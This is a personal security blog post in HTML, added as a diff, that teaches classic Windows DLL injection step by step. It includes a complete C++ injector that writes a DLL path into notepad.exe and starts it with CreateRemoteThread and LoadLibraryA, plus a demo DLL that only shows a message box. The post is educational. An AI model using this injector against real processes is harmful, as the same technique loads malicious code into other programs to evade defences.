@@ -1,0 +1,244 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>DLL Injection | Mohamed Khalil Mzali</title><meta name="author" content="Mohamed Khalil Mzali"><meta name="copyright" content="Mohamed Khalil Mzali"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="DLL injection consists on injecting a DLL within a memory region inside the virtual address space of a target process, before invoking a thread that calls LoadLibraryA from kernel32.dll to load that D">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DLL Injection">
+<meta property="og:url" content="https://cyberkmz.github.io/2024/12/31/DLLInjection/index.html">
+<meta property="og:site_name" content="Mohamed Khalil Mzali">
+<meta property="og:description" content="DLL injection consists on injecting a DLL within a memory region inside the virtual address space of a target process, before invoking a thread that calls LoadLibraryA from kernel32.dll to load that D">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cyberkmz.github.io/img/DLLInjection/img.jpg">
+<meta property="article:published_time" content="2024-12-30T23:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-31T09:40:06.662Z">
+<meta property="article:author" content="Mohamed Khalil Mzali">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cyberkmz.github.io/img/DLLInjection/img.jpg"><link rel="shortcut icon" href="/img/shield-halved-solid.svg"><link rel="canonical" href="https://cyberkmz.github.io/2024/12/31/DLLInjection/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'DLL Injection',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-31 10:40:06'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/CyberKMZ.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://mohamed-khalil-mzali.gitbook.io/mohamed-khalil-mzali"><i class="fa-fw fas fa-folder-open"></i><span> Gitbook</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://medium.com/@mzalimohamedkhalil"><i class="fa-fw fas fa-brands fa-medium"></i><span> Medium</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/CV-KhalilMzali.pdf"><i class="fa-fw fas fa-solid fa-file"></i><span> Resume</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/img/DLLInjection/img.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Mohamed Khalil Mzali"><span class="site-name">Mohamed Khalil Mzali</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://mohamed-khalil-mzali.gitbook.io/mohamed-khalil-mzali"><i class="fa-fw fas fa-folder-open"></i><span> Gitbook</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://medium.com/@mzalimohamedkhalil"><i class="fa-fw fas fa-brands fa-medium"></i><span> Medium</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/CV-KhalilMzali.pdf"><i class="fa-fw fas fa-solid fa-file"></i><span> Resume</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DLL Injection</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-30T23:00:00.000Z" title="Created 2024-12-31 00:00:00">2024-12-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-12-31T09:40:06.662Z" title="Updated 2024-12-31 10:40:06">2024-12-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Process-Injection-Techniques/">Process Injection Techniques</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="DLL Injection"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>DLL injection consists on injecting a DLL within a memory page inside the virtual address space of a target process, before invoking a thread that calls <code>LoadLibraryA</code> from <code>kernel32.dll</code> to load that DLL.</p>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>DLL injection consists on injecting a DLL within a memory region inside the virtual address space of a target process, before invoking a thread that calls <code>LoadLibraryA</code> from <code>kernel32.dll</code> to load that DLL. This process injection techniques involves:</p>
+<ul>
+<li><code>Toolhelp32</code>: To enumerate running processes within a read-only snapshot and search for a process by its name.</li>
+<li><code>OpenProcess</code>: To get a handle on a specific running process with necessary access rights.</li>
+<li><code>VirtualAllocEx</code>: To allocate a memory region within the virtual address space of the target process using its handle.</li>
+<li><code>WriteProcessMemory</code>: To copy the DLL path inside the allocated memory space.</li>
+<li><code>GetProcAddress</code>: To retrieve the <strong>LoadLibraryA</strong> address from <strong>kernel32.dll</strong> module.</li>
+<li><code>CreateRemoteThread</code>: To create a thread within the remote target process that will execute the <strong>LoadLibraryA</strong> loading the specified DLL.</li>
+</ul>
+<h2 id="Explanation"><a href="#Explanation" class="headerlink" title="Explanation"></a>Explanation</h2><p>For the DLL file, After that, we add a MessageBox inside <strong>DLL_PROCESS_ATTACH</strong>, so that it will be called when the generated DLL file is loaded by the calling process</p>
+<p><strong>Full DLL code</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;DLL Injection&quot;</span>, <span class="string">&quot;DLL injection is successful&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Once our DLL file is created, we begin by creating a read-only snapshot of all the system running processes using <code>CreateToolhelp32Snapshot</code> </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS,<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>TH32CS_SNAPPROCESS</code>: To include all running processes inside the snapshot </li>
+<li><code>NULL</code>: To indicate the current process</li>
+</ul>
+<p>Now, we enumerate the running processes within the snapshot with <code>Process32First</code> and <code>Process32Next</code> in order to find the process that matches a specific process name and return a handle on it</p>
+<p>Bu before using these 2 functions, we have to create a <code>PROCESSENTRY32</code> instance that will store all process information and set its <code>dwSize</code> to the size of the structure in bytes</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PROCESSENTRY32 pe32;</span><br><span class="line">pe<span class="number">32.</span>dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32W);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;pe32))</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>snapshot</code>: The current read-only snapshot we took of the running process in the system</li>
+<li><code>&amp;pe32</code>: A pointer to a <code>PROCESSENTRY32</code> structure that will contain the process information such as the name of the executable file, the process identifier, and the process identifier of the parent process</li>
+</ul>
+<p>And the same syntax will be applied in <code>Process32Next</code>.</p>
+<p>We then use that <code>pe32</code> pointer to check for a match between the name of the executable file for the process <code>szExeFile</code> and the wstring of the target process name in our case</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pe<span class="number">32.</span>szExeFile == ProcessName)</span><br></pre></td></tr></table></figure>
+
+<p>If there’s a match, we will open a handle to the remote target process using <code>OpenProcess</code></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hprocess=<span class="literal">nullptr</span>;</span><br><span class="line">hprocess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pe<span class="number">32.</span>th32ProcessID);</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>PROCESS_ALL_ACCESS</code>: To specify the access rights we want to have on the process</li>
+<li><code>FALSE</code>: As we don’t want the child processes of this process to inherit this handle</li>
+<li><code>pe32.th32ProcessID</code>: To specify the pid of the target process that matched our target process name previously</li>
+</ul>
+<p>We then close the handle to the read-only snapshot and return the handle to the target process</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line"><span class="keyword">return</span> hprocess;</span><br></pre></td></tr></table></figure>
+
+<p>Having a handle to the process, we allocate a memory region within the virtual address space of the remote target process using <code>VirtualAllocEx</code></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPVOID sc = <span class="built_in">VirtualAllocEx</span>(hprocess, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(DLLPath)<span class="number">+1</span>, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>hprocess</code>: Handle to the target process</li>
+<li><code>NULL</code>: As we do not have any specific starting address to specify for the allocation of the memory region, so we put it to NULL to let the function determine where to allocate the region</li>
+<li><code>sizeof(DLLPath)</code>: To specify the size of the path to the DLL we will inject into memory</li>
+<li><code>MEM_COMMIT|MEM_RESERVE</code>: To reserve and commit pages in one step</li>
+<li><code>PAGE_READWRITE</code>: As we only need these rights to write the DLL path into the newly allocated memory region</li>
+</ul>
+<p>Now, we copy the DLL path into the allocated memory region using <code>WriteProcessMemory</code></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WriteProcessMemory</span>(hprocess, sc, DLL_path, <span class="built_in">sizeof</span>(DLLPath)<span class="number">+1</span>, <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>hprocess</code>: Handle to the target process that we want to modify</li>
+<li><code>sc</code>: A pointer to the base address of the process we want to start writing from</li>
+<li><code>DLLPath</code>: A pointer to the buffer that contains the data to be written to the allocated memory region</li>
+<li><code>strlen(DLL_path)+1</code>: Size of the DLL path taking into account the null terminator byte</li>
+<li><code>NULL</code>: As we do not need to number of bytes written</li>
+</ul>
+<p>We then get a handle to <strong>kernel32.dll</strong> using <code>GetModuleHandleA</code></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HMODULE hkernel32 = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>kernel32.dll</code>: The loaded module</li>
+</ul>
+<p>We will use <code>GetProcAddress</code> to return the address of the <code>LoadLibraryA</code> function from <code>kernel32.dll</code></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FARPROC loadlibAddr = <span class="built_in">GetProcAddress</span>(hkernel32, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>hkernel32</code>:  The handle to to kernel32.dll from which we will load the desired procedures</li>
+<li><code>LoadLibraryA</code>: function that will load the specified DLL as a module within the target process</li>
+</ul>
+<p>Next, we create a remote thread that starts execution at the start address of <code>LoadLibraryA</code> to load our DLL file</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD TID;</span><br><span class="line">hthread = <span class="built_in">CreateRemoteThread</span>(hprocess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)loadlibAddr, sc, <span class="number">0</span>, &amp;TID);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>hprocess</code>: Handle to the target process</li>
+<li><code>NULL</code>: To get the default security descriptors for the thread and make it non-inheritable</li>
+<li><code>0</code>: To use the default size for the executable</li>
+<li><code>(LPTHREAD_START_ROUTINE)loadlibAddr</code>: To start execution at the starting address of <code>LoadLibraryA</code></li>
+<li><code>sc</code>: The parameter of <code>LoadLibraryA</code> function with the pointer to the DLL path</li>
+<li><code>0</code>: To make the thread run immediately after creation</li>
+<li><code>&amp;TID</code>: Pointer to the variable that receives the thread identifier</li>
+</ul>
+<h2 id="Demonstration"><a href="#Demonstration" class="headerlink" title="Demonstration"></a>Demonstration</h2><p>We execute our DLL injector and get the following output</p>
+<p><img src="/img/DLLInjection/Pasted%20image%2020241230203946.png"></p>
+<p>This screenshot below shows that the thread with <strong>Thread ID</strong> 8852 calls <strong>kernel32.dll</strong> to execute <strong>LoadLibraryA</strong> which loads our DLL file.<br><img src="/img/DLLInjection/Pasted%20image%2020241230203621.png"></p>
+<p>We can see that the DLL was correctly loaded within the target process’s modules<br><img src="/img/DLLInjection/Pasted%20image%2020241230203500.png"></p>
+<h2 id="Full-code"><a href="#Full-code" class="headerlink" title="Full code"></a>Full code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">SearchProcessByName</span><span class="params">(wstring&amp; processName)</span> </span>&#123;</span><br><span class="line">    PROCESSENTRY32W pe32;</span><br><span class="line">    pe<span class="number">32.</span>dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32W);</span><br><span class="line"></span><br><span class="line">    HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE hprocess = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (snapshot != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;pe32)) &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (processName == pe<span class="number">32.</span>szExeFile) &#123;</span><br><span class="line">                    hprocess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pe<span class="number">32.</span>th32ProcessID);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(snapshot, &amp;pe32));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">    <span class="keyword">return</span> hprocess;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Add the Path to the DLL in that variable</span></span><br><span class="line">    <span class="type">char</span> DLLPath[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;[*] DLLPath: &quot;</span> &lt;&lt; DLLPath &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    wstring pName = <span class="string">L&quot;notepad.exe&quot;</span>;</span><br><span class="line">    HANDLE hprocess = <span class="built_in">SearchProcessByName</span>(pName);</span><br><span class="line">    HANDLE hthread = <span class="literal">nullptr</span>;</span><br><span class="line">    DWORD TID;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hprocess) &#123;</span><br><span class="line">        wcout &lt;&lt; <span class="string">L&quot;[+] Obtained a handle &quot;</span> &lt;&lt; hprocess &lt;&lt; <span class="string">L&quot; to process &quot;</span> &lt;&lt; pName &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    LPVOID sc = <span class="built_in">VirtualAllocEx</span>(hprocess, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(DLLPath) + <span class="number">1</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (sc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[-] Could not allocate a memory region, error: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;[+] Allocated a memory region: &quot;</span> &lt;&lt; sc &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WriteProcessMemory</span>(hprocess, sc, DLLPath, <span class="built_in">sizeof</span>(DLLPath) + <span class="number">1</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        HMODULE hkernel32 = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">        FARPROC loadlibAddr = <span class="built_in">GetProcAddress</span>(hkernel32, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (loadlibAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;[-] Could not retrieve the LoadLibraryA address, error: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[+] Retrieved LoadLibraryA address: &quot;</span> &lt;&lt; loadlibAddr &lt;&lt; endl;</span><br><span class="line">        ;        hthread = <span class="built_in">CreateRemoteThread</span>(hprocess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)loadlibAddr, sc, <span class="number">0</span>, &amp;TID);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hthread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;[-] Failed to create a thread, error: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[+] Created a thread of ID &quot;</span> &lt;&lt; TID &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hthread, INFINITE);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hthread);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hprocess);</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[+] DLL injected successfully&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://cyberkmz.github.io">Mohamed Khalil Mzali</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://cyberkmz.github.io/2024/12/31/DLLInjection/">https://cyberkmz.github.io/2024/12/31/DLLInjection/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/DLLInjection/img.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/12/22/RemoteProcessInjection/" title="Remote Process Injection"><img class="cover" src="/img/RemoteProcessInjection/img.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">Remote Process Injection</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div 